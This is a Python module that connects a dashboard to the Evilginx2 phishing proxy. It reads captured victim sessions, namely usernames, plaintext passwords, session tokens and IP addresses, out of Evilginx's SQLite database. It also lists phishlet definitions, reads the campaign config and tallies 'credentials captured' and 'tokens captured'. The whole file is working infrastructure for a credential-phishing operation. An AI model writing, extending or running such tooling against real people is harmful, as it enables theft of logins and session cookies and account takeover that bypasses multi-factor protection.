"""Evilginx2 integration module.

Reads sessions and configuration directly from the Evilginx2 data directory
(mounted via Docker volume).  Evilginx has no REST API — all state lives in
a SQLite database (data.db) and YAML config files.

Expected volume layout (evilginx_data:/app):
    /app/data.db          – SQLite sessions database
    /app/config.json      – runtime config (domain, IP, phishlets state)
    /app/phishlets/*.yaml – phishlet definitions
    /app/crt/             – auto-generated TLS certificates
"""

import glob
import json
import os
import sqlite3
import time
from pathlib import Path

import yaml

# ── Paths ──
EVILGINX_DATA = os.getenv("EVILGINX_DATA_DIR", "/app/evilginx")
EVILGINX_URL = os.getenv("EVILGINX_URL", "http://evilginx:443")

_DB_PATH = os.path.join(EVILGINX_DATA, "data.db")
_CONFIG_PATH = os.path.join(EVILGINX_DATA, "config.json")
_PHISHLETS_DIR = os.path.join(EVILGINX_DATA, "phishlets")


# ═══════════════════════════════════════════════════════════════
#  AVAILABILITY CHECK
# ═══════════════════════════════════════════════════════════════

def is_available() -> bool:
    """Check if Evilginx data directory and database are accessible."""
    return os.path.isfile(_DB_PATH)


# ═══════════════════════════════════════════════════════════════
#  SESSIONS
# ═══════════════════════════════════════════════════════════════

def _parse_json_field(raw):
    """Safely parse a JSON-serialized SQLite column."""
    if not raw:
        return {}
    try:
        return json.loads(raw)
    except (json.JSONDecodeError, TypeError):
        return {}


def get_sessions() -> list[dict]:
    """Return all captured sessions from the Evilginx database."""
    if not is_available():
        return []

    sessions = []
    try:
        conn = sqlite3.connect(_DB_PATH, timeout=5)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute("SELECT * FROM sessions ORDER BY update_time DESC")
        for row in cur.fetchall():
            sessions.append({
                "id": row["id"],
                "phishlet": row["phishlet"],
                "landing_url": row["landing_url"],
                "username": row["username"],
                "password": row["password"],
                "session_id": row["session_id"],
                "useragent": row["useragent"],
                "remote_addr": row["remote_addr"],
                "create_time": row["create_time"],
                "update_time": row["update_time"],
                "tokens": _parse_json_field(row["tokens"]),
                "custom": _parse_json_field(row["custom"]),
            })
        conn.close()
    except (sqlite3.Error, KeyError):
        pass

    return sessions


def get_session(session_id: str) -> dict | None:
    """Return a single session by its session_id."""
    if not is_available():
        return None

    try:
        conn = sqlite3.connect(_DB_PATH, timeout=5)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
        row = cur.fetchone()
        conn.close()
        if not row:
            return None
        return {
            "id": row["id"],
            "phishlet": row["phishlet"],
            "landing_url": row["landing_url"],
            "username": row["username"],
            "password": row["password"],
            "session_id": row["session_id"],
            "useragent": row["useragent"],
            "remote_addr": row["remote_addr"],
            "create_time": row["create_time"],
            "update_time": row["update_time"],
            "tokens": _parse_json_field(row["tokens"]),
            "custom": _parse_json_field(row["custom"]),
        }
    except (sqlite3.Error, KeyError):
        return None


def delete_session(session_id: str) -> bool:
    """Delete a session by session_id. Returns True if deleted."""
    if not is_available():
        return False
    try:
        conn = sqlite3.connect(_DB_PATH, timeout=5)
        cur = conn.cursor()
        cur.execute("DELETE FROM sessions WHERE session_id = ?", (session_id,))
        deleted = cur.rowcount > 0
        conn.commit()
        conn.close()
        return deleted
    except sqlite3.Error:
        return False


# ═══════════════════════════════════════════════════════════════
#  PHISHLETS
# ═══════════════════════════════════════════════════════════════

def list_phishlets() -> list[dict]:
    """List all available phishlet YAML files with parsed metadata."""
    phishlets = []
    pattern = os.path.join(_PHISHLETS_DIR, "*.yaml")
    for path in sorted(glob.glob(pattern)):
        name = Path(path).stem
        try:
            with open(path) as f:
                data = yaml.safe_load(f) or {}
            phishlets.append({
                "name": name,
                "author": data.get("author", ""),
                "min_ver": data.get("min_ver", ""),
                "proxy_hosts": [h.get("phish_sub", "") + "." + h.get("domain", "")
                                for h in data.get("proxy_hosts", [])],
                "credentials": [c.get("name", "") for c in data.get("credentials", {}).get("username", [])
                                ] if isinstance(data.get("credentials"), dict) else [],
            })
        except (yaml.YAMLError, OSError):
            phishlets.append({"name": name, "error": "parse_failed"})
    return phishlets


def get_phishlet(name: str) -> dict | None:
    """Read and return the full parsed phishlet YAML."""
    path = os.path.join(_PHISHLETS_DIR, f"{name}.yaml")
    if not os.path.isfile(path):
        return None
    try:
        with open(path) as f:
            return yaml.safe_load(f)
    except (yaml.YAMLError, OSError):
        return None


# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════

def get_config() -> dict:
    """Read Evilginx runtime config (domain, IP, active phishlets)."""
    if not os.path.isfile(_CONFIG_PATH):
        return {}
    try:
        with open(_CONFIG_PATH) as f:
            return json.load(f)
    except (json.JSONDecodeError, OSError):
        return {}


# ═══════════════════════════════════════════════════════════════
#  STATS / SUMMARY
# ═══════════════════════════════════════════════════════════════

def get_stats() -> dict:
    """Aggregate stats across all sessions."""
    sessions = get_sessions()
    now = int(time.time())

    creds_captured = sum(1 for s in sessions if s.get("username"))
    tokens_captured = sum(1 for s in sessions if s.get("tokens"))
    phishlets_used = list({s["phishlet"] for s in sessions if s.get("phishlet")})

    recent_24h = [s for s in sessions if now - (s.get("update_time") or 0) < 86400]

    return {
        "total_sessions": len(sessions),
        "credentials_captured": creds_captured,
        "tokens_captured": tokens_captured,
        "phishlets_used": phishlets_used,
        "sessions_last_24h": len(recent_24h),
        "available": is_available(),
    }
